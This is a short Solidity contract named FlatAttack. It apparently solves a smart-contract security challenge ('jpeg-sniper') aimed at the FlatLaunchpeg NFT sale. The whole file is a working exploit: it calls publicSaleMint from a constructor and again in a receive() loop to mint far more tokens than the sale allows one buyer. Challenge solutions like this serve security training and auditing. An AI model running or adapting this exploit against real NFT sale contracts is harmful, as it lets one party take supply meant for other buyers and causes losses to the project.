// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../jpeg-sniper/FlatLaunchpeg.sol";

contract FlatAttack {
    constructor(address adr) payable {
        FlatLaunchpeg flat = FlatLaunchpeg(adr);
        flat.publicSaleMint{ value: msg.value }(3);
    }

    receive() external payable {
        FlatLaunchpeg flat = FlatLaunchpeg(msg.sender);
        for (uint256 i; i < 12; ++i) {
            flat.publicSaleMint{ value: msg.value }(3);
        }
    }
}
